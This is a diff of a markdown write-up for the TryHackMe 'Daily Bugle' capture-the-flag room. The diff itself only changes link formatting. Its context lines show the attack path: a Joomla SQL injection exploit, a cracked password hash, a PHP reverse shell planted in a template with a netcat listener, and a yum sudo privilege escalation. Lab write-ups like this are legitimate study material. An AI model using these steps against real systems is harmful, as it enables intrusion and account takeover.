@@ -15,7 +15,7 @@ PORT     STATE SERVICE VERSION
 3306/tcp open  mysql   MariaDB (unauthorized)
 ```
 
-Full nmap scan can be found here: [_link_]("https://github.com/Digital-Sherlock/OSCP-Toolbox/blob/master/TryHackMe/Daily%20Bugle/Nmap/basic_scan.nmap" "nmap")
+Full nmap scan can be found here: [_link_](https://github.com/Digital-Sherlock/OSCP-Toolbox/blob/master/TryHackMe/Daily%20Bugle/Nmap/basic_scan.nmap)
 
 **Vuln Nmap Scan (version):**
 
@@ -38,7 +38,7 @@ http-vuln-cve2017-8917:
 
 ```
 
-Full nmap vuln scan can be found here -> [_link_]("https://github.com/Digital-Sherlock/OSCP-Toolbox/blob/master/TryHackMe/Daily%20Bugle/Nmap/vuln_scan.nmap" "vuln_nmap")
+Full nmap vuln scan can be found here -> [_link_](https://github.com/Digital-Sherlock/OSCP-Toolbox/blob/master/TryHackMe/Daily%20Bugle/Nmap/vuln_scan.nmap)
 
 Joomla CMS seems to be vulnerable to SQL Injection.
 
@@ -46,7 +46,7 @@ Joomla CMS seems to be vulnerable to SQL Injection.
 
 ---
 
-The Exploit-DB's custom Python exploit - [Joomla! 3.7.0 - 'com_fields' SQL Injection]("https://www.exploit-db.com/exploits/42033" "link")
+The Exploit-DB's custom Python exploit - [Joomla! 3.7.0 - 'com_fields' SQL Injection](https://www.exploit-db.com/exploits/42033)
 
 Run: _*python joomblah.py http://ip-addr/*_
 
@@ -81,7 +81,7 @@ def joomla_370_sqli_extract(options, sess, token, colname, morequery):
 	return result
 ````
 
-[User\'s information]("https://github.com/Digital-Sherlock/OSCP-Toolbox/blob/master/TryHackMe/Daily%20Bugle/joomla_user_info.txt" "link to the file") retrieved:
+[User\'s information](https://github.com/Digital-Sherlock/OSCP-Toolbox/blob/master/TryHackMe/Daily%20Bugle/joomla_user_info.txt) retrieved:
 >Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
 
 JohnTheRipper Command: **_john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt_**
@@ -110,7 +110,7 @@ User credentials:
 ---
 1. Go to: Extensions > Templates > Beez3
 
-2. Change **_index.php_** file and paste the [php-reverse-shell]("https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" "github link") code.
+2. Change **_index.php_** file and paste the [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) code.
 
 3. Start NetCat listener: **_nc -lvnp 1234_**
 
@@ -237,7 +237,7 @@ User jjameson may run the following commands on dailybugle:
     (ALL) NOPASSWD: /usr/bin/yum
 ```
 
-2. [GTFOBins]("https://gtfobins.github.io/gtfobins/yum/" "gtfobins") yum PE:
+2. [GTFOBins](https://gtfobins.github.io/gtfobins/yum/) yum PE:
 
 ```bash
 TF=$(mktemp -d)
